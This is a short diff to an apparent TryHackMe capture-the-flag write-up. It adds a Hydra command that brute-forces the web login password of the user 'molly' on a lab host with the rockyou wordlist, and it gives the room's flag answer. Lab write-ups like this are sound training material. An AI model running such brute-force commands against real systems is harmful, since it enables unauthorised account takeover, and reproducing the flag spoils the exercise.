@@ -3,7 +3,9 @@
 
 # Use Hydra to bruteforce molly's web password. What is flag 1?
 
-
+```
+hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/login/:username=^USER^&password=^PASS^:F=incorrect" -t 50
+```
 ```
 THM{2673a7dd116de68e85c48ec0b1f2612e
 ```
